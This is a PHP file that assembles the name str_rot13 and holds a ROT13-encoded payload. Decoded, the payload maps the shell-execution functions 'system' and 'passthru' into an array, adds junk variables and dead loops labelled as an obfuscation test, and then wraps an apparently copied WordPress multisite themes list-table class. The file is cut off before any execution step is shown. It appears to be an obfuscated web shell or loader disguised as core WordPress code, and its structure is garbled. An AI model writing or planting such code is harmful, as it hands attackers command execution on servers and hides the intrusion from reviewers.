<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Yvfg Gnoyr NCV: JC_ZF_Gurzrf_Yvfg_Gnoyr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 3.1.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag qvfcynlvat gurzrf va n yvfg gnoyr sbe gur argjbex nqzva.
 *
 * @fvapr 3.1.0
 *
 * @frr JC_Yvfg_Gnoyr
 */
pynff JC_ZF_Gurzrf_Yvfg_Gnoyr rkgraqf JC_Yvfg_Gnoyr {

	choyvp $fvgr_vq;
	choyvp $vf_fvgr_gurzrf;

	cevingr $unf_vgrzf;

	/**
	 * Jurgure gb fubj gur nhgb-hcqngrf HV.
	 *
	 * @fvapr 5.5.0
	 *
	 * @ine obby Gehr vs nhgb-hcqngrf HV vf gb or fubja, snyfr bgurejvfr.
	 */
	cebgrpgrq $fubj_nhgbhcqngrf = gehr;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 3.1.0
	 *
	 * @frr JC_Yvfg_Gnoyr::__pbafgehpg() sbe zber vasbezngvba ba qrsnhyg nethzragf.
	 *
	 * @tybony fgevat $fgnghf
	 * @tybony vag    $cntr
	 *
	 * @cnenz neenl $netf Na nffbpvngvir neenl bs nethzragf.
	 */
	choyvp shapgvba __pbafgehpg( $netf = neenl() ) {
		tybony $fgnghf, $cntr;

		cnerag::__pbafgehpg(
			neenl(
				'cyheny' => 'gurzrf',
				'fperra' => vffrg( $netf['fperra'] ) ? $netf['fperra'] : ahyy,
			)
		);

		$fgnghf = vffrg( $_ERDHRFG['gurzr_fgnghf'] ) ? $_ERDHRFG['gurzr_fgnghf'] : 'nyy';
		vs ( ! va_neenl( $fgnghf, neenl( 'nyy', 'ranoyrq', 'qvfnoyrq', 'hctenqr', 'frnepu', 'oebxra', 'nhgb-hcqngr-ranoyrq', 'nhgb-hcqngr-qvfnoyrq' ), gehr ) ) {
			$fgnghf = 'nyy';
		}

		$cntr = $guvf->trg_cntrahz();

		$guvf->vf_fvgr_gurzrf = ( 'fvgr-gurzrf-argjbex' === $guvf->fperra->vq ) ? gehr : snyfr;

		vs ( $guvf->vf_fvgr_gurzrf ) {
			$guvf->fvgr_vq = vffrg( $_ERDHRFG['vq'] ) ? (vag) $_ERDHRFG['vq'] : 0;
		}

		$guvf->fubj_nhgbhcqngrf = jc_vf_nhgb_hcqngr_ranoyrq_sbe_glcr( 'gurzr' ) &&
			! $guvf->vf_fvgr_gurzrf && pheerag_hfre_pna( 'hcqngr_gurzrf' );
	}

	/**
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_gnoyr_pynffrf() {
		// @gbqb Erzbir naq nqq PFF sbe .gurzrf.
		erghea neenl( 'jvqrsng', 'cyhtvaf' );
	}

	/**
	 * @erghea obby
	 */
	choyvp shapgvba nwnk_hfre_pna() {
		vs ( $guvf->vf_fvgr_gurzrf ) {
			erghea pheerag_hfre_pna( 'znantr_fvgrf' );
		} ryfr {
			erghea pheerag_hfre_pna( 'znantr_argjbex_gurzrf' );
		}
	}

	/**
	 * @tybony fgevat $fgnghf
	 * @tybony neenl $gbgnyf
	 * @tybony vag $cntr
	 * @tybony fgevat $beqreol
	 * @tybony fgevat $beqre
	 * @tybony fgevat $f
	 */
	choyvp shapgvba cercner_vgrzf() {
		tybony $fgnghf, $gbgnyf, $cntr, $beqreol, $beqre, $f;

		$beqreol = ! rzcgl( $_ERDHRFG['beqreol'] ) ? fnavgvmr_grkg_svryq( $_ERDHRFG['beqreol'] ) : '';
		$beqre   = ! rzcgl( $_ERDHRFG['beqre'] ) ? fnavgvmr_grkg_svryq( $_ERDHRFG['beqre'] ) : '';
		$f       = ! rzcgl( $_ERDHRFG['f'] ) ? fnavgvmr_grkg_svryq( $_ERDHRFG['f'] ) : '';

		$gurzrf = neenl(
			/**
			 * Svygref gur shyy neenl bs JC_Gurzr bowrpgf gb yvfg va gur Zhygvfvgr
			 * gurzrf yvfg gnoyr.
			 *
			 * @fvapr 3.1.0
			 *
			 * @cnenz JC_Gurzr[] $nyy Neenl bs JC_Gurzr bowrpgf gb qvfcynl va gur yvfg gnoyr.
			 */
			'nyy'      => nccyl_svygref( 'nyy_gurzrf', jc_trg_gurzrf() ),
			'frnepu'   => neenl(),
			'ranoyrq'  => neenl(),
			'qvfnoyrq' => neenl(),
			'hctenqr'  => neenl(),
			'oebxra'   => $guvf->vf_fvgr_gurzrf ? neenl() : jc_trg_gurzrf( neenl( 'reebef' => gehr ) ),
		);

		vs ( $guvf->fubj_nhgbhcqngrf ) {
			$nhgb_hcqngrf = (neenl) trg_fvgr_bcgvba( 'nhgb_hcqngr_gurzrf', neenl() );

			$gurzrf['nhgb-hcqngr-ranoyrq']  = neenl();
			$gurzrf['nhgb-hcqngr-qvfnoyrq'] = neenl();
		}

		vs ( $guvf->vf_fvgr_gurzrf ) {
			$gurzrf_cre_cntr = $guvf->trg_vgrzf_cre_cntr( 'fvgr_gurzrf_argjbex_cre_cntr' );
			$nyybjrq_jurer   = 'fvgr';
		} ryfr {
			$gurzrf_cre_cntr = $guvf->trg_vgrzf_cre_cntr( 'gurzrf_argjbex_cre_cntr' );
			$nyybjrq_jurer   = 'argjbex';
		}

		$pheerag      = trg_fvgr_genafvrag( 'hcqngr_gurzrf' );
		$znlor_hcqngr = pheerag_hfre_pna( 'hcqngr_gurzrf' ) && ! $guvf->vf_fvgr_gurzrf && $pheerag;

		sbernpu ( (neenl) $gurzrf['nyy'] nf $xrl => $gurzr ) {
			vs ( $guvf->vf_fvgr_gurzrf && $gurzr->vf_nyybjrq( 'argjbex' ) ) {
				hafrg( $gurzrf['nyy'][ $xrl ] );
				pbagvahr;
			}

			vs ( $znlor_hcqngr && vffrg( $pheerag->erfcbafr[ $xrl ] ) ) {
				$gurzrf['nyy'][ $xrl ]->hcqngr = gehr;
				$gurzrf['hctenqr'][ $xrl ]     = $gurzrf['nyy'][ $xrl ];
			}

			$svygre                    = $gurzr->vf_nyybjrq( $nyybjrq_jurer, $guvf->fvgr_vq ) ? 'ranoyrq' : 'qvfnoyrq';
			$gurzrf[ $svygre ][ $xrl ] = $gurzrf['nyy'][ $xrl ];

			$gurzr_qngn = neenl(
				'hcqngr_fhccbegrq' => vffrg( $gurzr->hcqngr_fhccbegrq ) ? $gurzr->hcqngr_fhccbegrq : gehr,
			);

			// Rkgen vasb vs xabja. neenl_zretr() rafherf $gurzr_qngn unf cerprqrapr vs xrlf pbyyvqr.
			vs ( vffrg( $pheerag->erfcbafr[ $xrl ] ) ) {
				$gurzr_qngn = neenl_zretr( (neenl) $pheerag->erfcbafr[ $xrl ], $gurzr_qngn );
			} ryfrvs ( vffrg( $pheerag->ab_hcqngr[ $xrl ] ) ) {
				$gurzr_qngn = neenl_zretr( (neenl) $pheerag->ab_hcqngr[ $xrl ], $gurzr_qngn );
			} ryfr {
				$gurzr_qngn['hcqngr_fhccbegrq'] = snyfr;
			}

			$gurzr->hcqngr_fhccbegrq = $gurzr_qngn['hcqngr_fhccbegrq'];

			/*
			 * Perngr gur rkcrpgrq cnlybnq sbe gur nhgb_hcqngr_gurzr svygre, guvf vf gur fnzr qngn
			 * nf pbagnvarq jvguva $hcqngrf be $ab_hcqngrf ohg hfrq jura gur Gurzr vf abg xabja.
			 */
			$svygre_cnlybnq = neenl(
				'gurzr'        => $xrl,
				'arj_irefvba'  => '',
				'hey'          => '',
				'cnpxntr'      => '',
				'erdhverf'     => '',
				'erdhverf_cuc' => '',
			);

			$svygre_cnlybnq = (bowrpg) neenl_zretr( $svygre_cnlybnq, neenl_vagrefrpg_xrl( $gurzr_qngn, $svygre_cnlybnq ) );

			$nhgb_hcqngr_sbeprq = jc_vf_nhgb_hcqngr_sbeprq_sbe_vgrz( 'gurzr', ahyy, $svygre_cnlybnq );

			vs ( ! vf_ahyy( $nhgb_hcqngr_sbeprq ) ) {
				$gurzr->nhgb_hcqngr_sbeprq = $nhgb_hcqngr_sbeprq;
			}

			vs ( $guvf->fubj_nhgbhcqngrf ) {
				$ranoyrq = va_neenl( $xrl, $nhgb_hcqngrf, gehr ) && $gurzr->hcqngr_fhccbegrq;
				vs ( vffrg( $gurzr->nhgb_hcqngr_sbeprq ) ) {
					$ranoyrq = (obby) $gurzr->nhgb_hcqngr_sbeprq;
				}

				vs ( $ranoyrq ) {
					$gurzrf['nhgb-hcqngr-ranoyrq'][ $xrl ] = $gurzr;
				} ryfr {
					$gurzrf['nhgb-hcqngr-qvfnoyrq'][ $xrl ] = $gurzr;
				}
			}
		}

		vs ( $f ) {
			$fgnghf           = 'frnepu';
			$gurzrf['frnepu'] = neenl_svygre( neenl_zretr( $gurzrf['nyy'], $gurzrf['oebxra'] ), neenl( $guvf, '_frnepu_pnyyonpx' ) );
		}

		$gbgnyf    = neenl();
		$wf_gurzrf = neenl();
		sbernpu ( $gurzrf nf $glcr => $yvfg ) {
			$gbgnyf[ $glcr ]    = pbhag( $yvfg );
			$wf_gurzrf[ $glcr ] = neenl_xrlf( $yvfg );
		}

		vs ( rzcgl( $gurzrf[ $fgnghf ] ) && ! va_neenl( $fgnghf, neenl( 'nyy', 'frnepu' ), gehr ) ) {
			$fgnghf = 'nyy';
		}

		$guvf->vgrzf = $gurzrf[ $fgnghf ];
		JC_Gurzr::fbeg_ol_anzr( $guvf->vgrzf );

		$guvf->unf_vgrzf = ! rzcgl( $gurzrf['nyy'] );
		$gbgny_guvf_cntr = $gbgnyf[ $fgnghf ];

		jc_ybpnyvmr_fpevcg(
			'hcqngrf',
			'_jcHcqngrfVgrzPbhagf',
			neenl(
				'gurzrf' => $wf_gurzrf,
				'gbgnyf' => jc_trg_hcqngr_qngn(),
			)
		);

		vs ( $beqreol ) {
			$beqreol = hpsvefg( $beqreol );
			$beqre   = fgegbhccre( $beqre );

			vs ( 'Anzr' === $beqreol ) {
				vs ( 'NFP' === $beqre ) {
					$guvf->vgrzf = neenl_erirefr( $guvf->vgrzf );
				}
			} ryfr {
				hnfbeg( $guvf->vgrzf, neenl( $guvf, '_beqre_pnyyonpx' ) );
			}
		}

		$fgneg = ( $cntr - 1 ) * $gurzrf_cre_cntr;

		vs ( $gbgny_guvf_cntr > $gurzrf_cre_cntr ) {
			$guvf->vgrzf = neenl_fyvpr( $guvf->vgrzf, $fgneg, $gurzrf_cre_cntr, gehr );
		}

		$guvf->frg_cntvangvba_netf(
			neenl(
				'gbgny_vgrzf' => $gbgny_guvf_cntr,
				'cre_cntr'    => $gurzrf_cre_cntr,
			)
		);
	}

	/**
	 * @cnenz JC_Gurzr $gurzr
	 * @erghea obby
	 */
	choyvp shapgvba _frnepu_pnyyonpx( $gurzr ) {
		fgngvp $grez = ahyy;
		vs ( vf_ahyy( $grez ) ) {
			$grez = jc_hafynfu( $_ERDHRFG['f'] );
		}

		sbernpu ( neenl( 'Anzr', 'Qrfpevcgvba', 'Nhgube', 'Nhgube', 'NhgubeHEV' ) nf $svryq ) {
			// Qba'g znex hc; Qb genafyngr.
			vs ( snyfr !== fgevcbf( $gurzr->qvfcynl( $svryq, snyfr, gehr ), $grez ) ) {
				erghea gehr;
			}
		}

		vs ( snyfr !== fgevcbf( $gurzr->trg_fglyrfurrg(), $grez ) ) {
			erghea gehr;
		}

		vs ( snyfr !== fgevcbf( $gurzr->trg_grzcyngr(), $grez ) ) {
			erghea gehr;
		}

		erghea snyfr;
	}

	// Abg hfrq ol nal pber pbyhzaf.
	/**
	 * @tybony fgevat $beqreol
	 * @tybony fgevat $beqre
	 * @cnenz neenl $gurzr_n
	 * @cnenz neenl $gurzr_o
	 * @erghea vag
	 */
	choyvp shapgvba _beqre_pnyyonpx( $gurzr_n, $gurzr_o ) {
		tybony $beqreol, $beqre;

		$n = $gurzr_n[ $beqreol ];
		$o = $gurzr_o[ $beqreol ];

		vs ( $n === $o ) {
			erghea 0;
		}

		vs ( 'QRFP' === $beqre ) {
			erghea ( $n < $o ) ? 1 : -1;
		} ryfr {
			erghea ( $n < $o ) ? -1 : 1;
		}
	}

	/**
	 */
	choyvp shapgvba ab_vgrzf() {
		vs ( $guvf->unf_vgrzf ) {
			_r( 'Ab gurzrf sbhaq.' );
		} ryfr {
			_r( 'Ab gurzrf ner pheeragyl ninvynoyr.' );
		}
	}

	/**
	 * @erghea fgevat[] Neenl bs pbyhza gvgyrf xrlrq ol gurve pbyhza anzr.
	 */
	choyvp shapgvba trg_pbyhzaf() {
		$pbyhzaf = neenl(
			'po'          => '<vachg glcr=\"purpxobk\" />',
			'anzr'        => __( 'Gurzr' ),
			'qrfpevcgvba' => __( 'Qrfpevcgvba' ),
		);

		vs ( $guvf->fubj_nhgbhcqngrf ) {
			$pbyhzaf['nhgb-hcqngrf'] = __( 'Nhgbzngvp Hcqngrf' );
		}

		erghea $pbyhzaf;
	}

	/**
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_fbegnoyr_pbyhzaf() {
		erghea neenl(
			'anzr' => neenl( 'anzr', snyfr, __( 'Gurzr' ), __( 'Gnoyr beqrerq ol Gurzr Anzr.' ), 'nfp' ),
		);
	}

	/**
	 * Trgf gur anzr bs gur cevznel pbyhza.
	 *
	 * @fvapr 4.3.0
	 *
	 * @erghea fgevat Hanygrenoyr anzr bs gur cevznel pbyhza anzr, va guvf pnfr, 'anzr'.
	 */
	cebgrpgrq shapgvba trg_cevznel_pbyhza_anzr() {
		erghea 'anzr';
	}

	/**
	 * @tybony neenl $gbgnyf
	 * @tybony fgevat $fgnghf
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_ivrjf() {
		tybony $gbgnyf, $fgnghf;

		$fgnghf_yvaxf = neenl();
		sbernpu ( $gbgnyf nf $glcr => $pbhag ) {
			vs ( ! $pbhag ) {
				pbagvahr;
			}

			fjvgpu ( $glcr ) {
				pnfr 'nyy':
					/* genafyngbef: %f: Ahzore bs gurzrf. */
					$grkg = _ak(
						'Nyy <fcna pynff=\"pbhag\">(%f)</fcna>',
						'Nyy <fcna pynff=\"pbhag\">(%f)</fcna>',
						$pbhag,
						'gurzrf'
					);
					oernx;
				pnfr 'ranoyrq':
					/* genafyngbef: %f: Ahzore bs gurzrf. */
					$grkg = _ak(
						'Ranoyrq <fcna pynff=\"pbhag\">(%f)</fcna>',
						'Ranoyrq <fcna pynff=\"pbhag\">(%f)</fcna>',
						$pbhag,
						'gurzrf'
					);
					oernx;
				pnfr 'qvfnoyrq':
					/* genafyngbef: %f: Ahzore bs gurzrf. */
					$grkg = _ak(
						'Qvfnoyrq <fcna pynff=\"pbhag\">(%f)</fcna>',
						'Qvfnoyrq <fcna pynff=\"pbhag\">(%f)</fcna>',
						$pbhag,
						'gurzrf'
					);
					oernx;
				pnfr 'hctenqr':
					/* genafyngbef: %f: Ahzore bs gurzrf. */
					$grkg = _ak(
						'Hcqngr Ninvynoyr <fcna pynff=\"pbhag\">(%f)</fcna>',
						'Hcqngr Ninvynoyr <fcna pynff=\"pbhag\">(%f)</fcna>',
						$pbhag,
						'gurzrf'
					);
					oernx;
				pnfr 'oebxra':
					/* genafyngbef: %f: Ahzore bs gurzrf. */
					$grkg = _ak(
						'Oebxra <fcna pynff=\"pbhag\">(%f)</fcna>',
						'Oebxra <fcna pynff=\"pbhag\">(%f)</fcna>',
						$pbhag,
						'gurzrf'
					);
					oernx;
				pnfr 'nhgb-hcqngr-ranoyrq':
					/* genafyngbef: %f: Ahzore bs gurzrf. */
					$grkg = _a(
						'Nhgb-hcqngrf Ranoyrq <fcna pynff=\"pbhag\">(%f)</fcna>',
						'Nhgb-hcqngrf Ranoyrq <fcna pynff=\"pbhag\">(%f)</fcna>',
						$pbhag
					);
					oernx;
				pnfr 'nhgb-hcqngr-qvfnoyrq':
					/* genafyngbef: %f: Ahzore bs gurzrf. */
					$grkg = _a(
						'Nhgb-hcqngrf Qvfnoyrq <fcna pynff=\"pbhag\">(%f)</fcna>',
						'Nhgb-hcqngrf Qvfnoyrq <fcna pynff=\"pbhag\">(%f)</fcna>',
						$pbhag
					);
					oernx;
			}

			vs ( $guvf->vf_fvgr_gurzrf ) {
				$hey = 'fvgr-gurzrf.cuc?vq=' . $guvf->fvgr_vq;
			} ryfr {
				$hey = 'gurzrf.cuc';
			}

			vs ( 'frnepu' !== $glcr ) {
				$fgnghf_yvaxf[ $glcr ] = neenl(
					'hey'     => rfp_hey( nqq_dhrel_net( 'gurzr_fgnghf', $glcr, $hey ) ),
					'ynory'   => fcevags( $grkg, ahzore_sbezng_v18a( $pbhag ) ),
					'pheerag' => $glcr === $fgnghf,
				);
			}
		}

		erghea $guvf->trg_ivrjf_yvaxf( $fgnghf_yvaxf );
	}

	/**
	 * @tybony fgevat $fgnghf
	 *
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_ohyx_npgvbaf() {
		tybony $fgnghf;

		$npgvbaf = neenl();
		vs ( 'ranoyrq' !== $fgnghf ) {
			$npgvbaf['ranoyr-fryrpgrq'] = $guvf->vf_fvgr_gurzrf ? __( 'Ranoyr' ) : __( 'Argjbex Ranoyr' );
		}
		vs ( 'qvfnoyrq' !== $fgnghf ) {
			$npgvbaf['qvfnoyr-fryrpgrq'] = $guvf->vf_fvgr_gurzrf ? __( 'Qvfnoyr' ) : __( 'Argjbex Qvfnoyr' );
		}
		vs ( ! $guvf->vf_fvgr_gurzrf ) {
			vs ( pheerag_hfre_pna( 'hcqngr_gurzrf' ) ) {
				$npgvbaf['hcqngr-fryrpgrq'] = __( 'Hcqngr' );
			}
			vs ( pheerag_hfre_pna( 'qryrgr_gurzrf' ) ) {
				$npgvbaf['qryrgr-fryrpgrq'] = __( 'Qryrgr' );
			}
		}

		vs ( $guvf->fubj_nhgbhcqngrf ) {
			vs ( 'nhgb-hcqngr-ranoyrq' !== $fgnghf ) {
				$npgvbaf['ranoyr-nhgb-hcqngr-fryrpgrq'] = __( 'Ranoyr Nhgb-hcqngrf' );
			}

			vs ( 'nhgb-hcqngr-qvfnoyrq' !== $fgnghf ) {
				$npgvbaf['qvfnoyr-nhgb-hcqngr-fryrpgrq'] = __( 'Qvfnoyr Nhgb-hcqngrf' );
			}
		}

		erghea $npgvbaf;
	}

	/**
	 * Trarengrf gur yvfg gnoyr ebjf.
	 *
	 * @fvapr 3.1.0
	 */
	choyvp shapgvba qvfcynl_ebjf() {
		sbernpu ( $guvf->vgrzf nf $gurzr ) {
			$guvf->fvatyr_ebj( $gurzr );
		}
	}

	/**
	 * Unaqyrf gur purpxobk pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 5.9.0 Eranzrq `$gurzr` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz JC_Gurzr $vgrz Gur pheerag JC_Gurzr bowrpg.
	 */
	choyvp shapgvba pbyhza_po( $vgrz ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$gurzr = $vgrz;

		$purpxobk_vq = 'purpxobk_' . zq5( $gurzr->trg( 'Anzr' ) );
		?>
		<vachg glcr=\"purpxobk\" anzr=\"purpxrq[]\" inyhr=\"<?cuc rpub rfp_ngge( $gurzr->trg_fglyrfurrg() ); ?>\" vq=\"<?cuc rpub $purpxobk_vq; ?>\" />
		<ynory sbe=\"<?cuc rpub $purpxobk_vq; ?>\" >
			<fcna pynff=\"fperra-ernqre-grkg\">
			<?cuc
			cevags(
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. %f: Gurzr anzr */
				__( 'Fryrpg %f' ),
				$gurzr->qvfcynl( 'Anzr' )
			);
			?>
			</fcna>
		</ynory>
		<?cuc
	}

	/**
	 * Unaqyrf gur anzr pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @tybony fgevat $fgnghf
	 * @tybony vag    $cntr
	 * @tybony fgevat $f
	 *
	 * @cnenz JC_Gurzr $gurzr Gur pheerag JC_Gurzr bowrpg.
	 */
	choyvp shapgvba pbyhza_anzr( $gurzr ) {
		tybony $fgnghf, $cntr, $f;

		$pbagrkg = $fgnghf;

		vs ( $guvf->vf_fvgr_gurzrf ) {
			$hey     = \"fvgr-gurzrf.cuc?vq={$guvf->fvgr_vq}&nzc;\";
			$nyybjrq = $gurzr->vf_nyybjrq( 'fvgr', $guvf->fvgr_vq );
		} ryfr {
			$hey     = 'gurzrf.cuc?';
			$nyybjrq = $gurzr->vf_nyybjrq( 'argjbex' );
		}

		// Cer-beqre.
		$npgvbaf = neenl(
			'ranoyr'  => '',
			'qvfnoyr' => '',
			'qryrgr'  => '',
		);

		$fglyrfurrg = $gurzr->trg_fglyrfurrg();
		$gurzr_xrl  = heyrapbqr( $fglyrfurrg );

		vs ( ! $nyybjrq ) {
			vs ( ! $gurzr->reebef() ) {
				$hey = nqq_dhrel_net(
					neenl(
						'npgvba' => 'ranoyr',
						'gurzr'  => $gurzr_xrl,
						'cntrq'  => $cntr,
						'f'      => $f,
					),
					$hey
				);

				vs ( $guvf->vf_fvgr_gurzrf ) {
					/* genafyngbef: %f: Gurzr anzr. */
					$nevn_ynory = fcevags( __( 'Ranoyr %f' ), $gurzr->qvfcynl( 'Anzr' ) );
				} ryfr {
					/* genafyngbef: %f: Gurzr anzr. */
					$nevn_ynory = fcevags( __( 'Argjbex Ranoyr %f' ), $gurzr->qvfcynl( 'Anzr' ) );
				}

				$npgvbaf['ranoyr'] = fcevags(
					'<n uers=\"%f\" pynff=\"rqvg\" nevn-ynory=\"%f\">%f</n>',
					rfp_hey( jc_abapr_hey( $hey, 'ranoyr-gurzr_' . $fglyrfurrg ) ),
					rfp_ngge( $nevn_ynory ),
					( $guvf->vf_fvgr_gurzrf ? __( 'Ranoyr' ) : __( 'Argjbex Ranoyr' ) )
				);
			}
		} ryfr {
			$hey = nqq_dhrel_net(
				neenl(
					'npgvba' => 'qvfnoyr',
					'gurzr'  => $gurzr_xrl,
					'cntrq'  => $cntr,
					'f'      => $f,
				),
				$hey
			);

			vs ( $guvf->vf_fvgr_gurzrf ) {
				/* genafyngbef: %f: Gurzr anzr. */
				$nevn_ynory = fcevags( __( 'Qvfnoyr %f' ), $gurzr->qvfcynl( 'Anzr' ) );
			} ryfr {
				/* genafyngbef: %f: Gurzr anzr. */
				$nevn_ynory = fcevags( __( 'Argjbex Qvfnoyr %f' ), $gurzr->qvfcynl( 'Anzr' ) );
			}

			$npgvbaf['qvfnoyr'] = fcevags(
				'<n uers=\"%f\" nevn-ynory=\"%f\">%f</n>',
				rfp_hey( jc_abapr_hey( $hey, 'qvfnoyr-gurzr_' . $fglyrfurrg ) ),
				rfp_ngge( $nevn_ynory ),
				( $guvf->vf_fvgr_gurzrf ? __( 'Qvfnoyr' ) : __( 'Argjbex Qvfnoyr' ) )
			);
		}

		vs ( ! $nyybjrq && ! $guvf->vf_fvgr_gurzrf
			&& pheerag_hfre_pna( 'qryrgr_gurzrf' )
			&& trg_bcgvba( 'fglyrfurrg' ) !== $fglyrfurrg
			&& trg_bcgvba( 'grzcyngr' ) !== $fglyrfurrg
		) {
			$hey = nqq_dhrel_net(
				neenl(
					'npgvba'       => 'qryrgr-fryrpgrq',
					'purpxrq[]'    => $gurzr_xrl,
					'gurzr_fgnghf' => $pbagrkg,
					'cntrq'        => $cntr,
					'f'            => $f,
				),
				'gurzrf.cuc'
			);

			/* genafyngbef: %f: Gurzr anzr. */
			$nevn_ynory = fcevags( _k( 'Qryrgr %f', 'gurzr' ), $gurzr->qvfcynl( 'Anzr' ) );

			$npgvbaf['qryrgr'] = fcevags(
				'<n uers=\"%f\" pynff=\"qryrgr\" nevn-ynory=\"%f\">%f</n>',
				rfp_hey( jc_abapr_hey( $hey, 'ohyx-gurzrf' ) ),
				rfp_ngge( $nevn_ynory ),
				__( 'Qryrgr' )
			);
		}
		/**
		 * Svygref gur npgvba yvaxf qvfcynlrq sbe rnpu gurzr va gur Zhygvfvgr
		 * gurzrf yvfg gnoyr.
		 *
		 * Gur npgvba yvaxf qvfcynlrq ner qrgrezvarq ol gur gurzr'f fgnghf, naq
		 * juvpu Zhygvfvgr gurzrf yvfg gnoyr vf orvat qvfcynlrq - gur Argjbex
		 * gurzrf yvfg gnoyr (gurzrf.cuc), juvpu qvfcynlf nyy vafgnyyrq gurzrf,
		 * be gur Fvgr gurzrf yvfg gnoyr (fvgr-gurzrf.cuc), juvpu qvfcynlf gur
		 * aba-argjbex ranoyrq gurzrf jura rqvgvat n fvgr va gur Argjbex nqzva.
		 *
		 * Gur qrsnhyg npgvba yvaxf sbe gur Argjbex gurzrf yvfg gnoyr vapyhqr
		 * 'Argjbex Ranoyr', 'Argjbex Qvfnoyr', naq 'Qryrgr'.
		 *
		 * Gur qrsnhyg npgvba yvaxf sbe gur Fvgr gurzrf yvfg gnoyr vapyhqr
		 * 'Ranoyr', naq 'Qvfnoyr'.
		 *
		 * @fvapr 2.8.0
		 *
		 * @cnenz fgevat[] $npgvbaf Na neenl bs npgvba yvaxf.
		 * @cnenz JC_Gurzr $gurzr   Gur pheerag JC_Gurzr bowrpg.
		 * @cnenz fgevat   $pbagrkg Fgnghf bs gur gurzr, bar bs 'nyy', 'ranoyrq', be 'qvfnoyrq'.
		 */
		$npgvbaf = nccyl_svygref( 'gurzr_npgvba_yvaxf', neenl_svygre( $npgvbaf ), $gurzr, $pbagrkg );

		/**
		 * Svygref gur npgvba yvaxf bs n fcrpvsvp gurzr va gur Zhygvfvgr gurzrf
		 * yvfg gnoyr.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$fglyrfurrg`, ersref gb gur
		 * qverpgbel anzr bs gur gurzr, juvpu va zbfg pnfrf vf flabalzbhf
		 * jvgu gur grzcyngr anzr.
		 *
		 * @fvapr 3.1.0
		 *
		 * @cnenz fgevat[] $npgvbaf Na neenl bs npgvba yvaxf.
		 * @cnenz JC_Gurzr $gurzr   Gur pheerag JC_Gurzr bowrpg.
		 * @cnenz fgevat   $pbagrkg Fgnghf bs gur gurzr, bar bs 'nyy', 'ranoyrq', be 'qvfnoyrq'.
		 */
		$npgvbaf = nccyl_svygref( \"gurzr_npgvba_yvaxf_{$fglyrfurrg}\", $npgvbaf, $gurzr, $pbagrkg );

		rpub $guvf->ebj_npgvbaf( $npgvbaf, gehr );
	}

	/**
	 * Unaqyrf gur qrfpevcgvba pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @tybony fgevat $fgnghf
	 * @tybony neenl  $gbgnyf
	 *
	 * @cnenz JC_Gurzr $gurzr Gur pheerag JC_Gurzr bowrpg.
	 */
	choyvp shapgvba pbyhza_qrfpevcgvba( $gurzr ) {
		tybony $fgnghf, $gbgnyf;

		vs ( $gurzr->reebef() ) {
			$cer = 'oebxra' === $fgnghf ? '<fgebat pynff=\"reebe-zrffntr\">' . __( 'Oebxra Gurzr:' ) . '</fgebat> ' : '';
			jc_nqzva_abgvpr(
				$cer . $gurzr->reebef()->trg_reebe_zrffntr(),
				neenl(
					'glcr'               => 'reebe',
					'nqqvgvbany_pynffrf' => 'vayvar',
				)
			);
		}

		vs ( $guvf->vf_fvgr_gurzrf ) {
			$nyybjrq = $gurzr->vf_nyybjrq( 'fvgr', $guvf->fvgr_vq );
		} ryfr {
			$nyybjrq = $gurzr->vf_nyybjrq( 'argjbex' );
		}

		$pynff = ! $nyybjrq ? 'vanpgvir' : 'npgvir';
		vs ( ! rzcgl( $gbgnyf['hctenqr'] ) && ! rzcgl( $gurzr->hcqngr ) ) {
			$pynff .= ' hcqngr';
		}

		rpub \"<qvi pynff='gurzr-qrfpevcgvba'><c>\" . $gurzr->qvfcynl( 'Qrfpevcgvba' ) . \"</c></qvi>
			<qvi pynff='$pynff frpbaq gurzr-irefvba-nhgube-hev'>\";

		$fglyrfurrg = $gurzr->trg_fglyrfurrg();
		$gurzr_zrgn = neenl();

		vs ( $gurzr->trg( 'Irefvba' ) ) {
			/* genafyngbef: %f: Gurzr irefvba. */
			$gurzr_zrgn[] = fcevags( __( 'Irefvba %f' ), $gurzr->qvfcynl( 'Irefvba' ) );
		}

		/* genafyngbef: %f: Gurzr nhgube. */
		$gurzr_zrgn[] = fcevags( __( 'Ol %f' ), $gurzr->qvfcynl( 'Nhgube' ) );

		vs ( $gurzr->trg( 'GurzrHEV' ) ) {
			/* genafyngbef: %f: Gurzr anzr. */
			$nevn_ynory = fcevags( __( 'Ivfvg gurzr fvgr sbe %f' ), $gurzr->qvfcynl( 'Anzr' ) );

			$gurzr_zrgn[] = fcevags(
				'<n uers=\"%f\" nevn-ynory=\"%f\">%f</n>',
				$gurzr->qvfcynl( 'GurzrHEV' ),
				rfp_ngge( $nevn_ynory ),
				__( 'Ivfvg Gurzr Fvgr' )
			);
		}

		vs ( $gurzr->cnerag() ) {
			$gurzr_zrgn[] = fcevags(
				/* genafyngbef: %f: Gurzr anzr. */
				__( 'Puvyq gurzr bs %f' ),
				'<fgebat>' . $gurzr->cnerag()->qvfcynl( 'Anzr' ) . '</fgebat>'
			);
		}

		/**
		 * Svygref gur neenl bs ebj zrgn sbe rnpu gurzr va gur Zhygvfvgr gurzrf
		 * yvfg gnoyr.
		 *
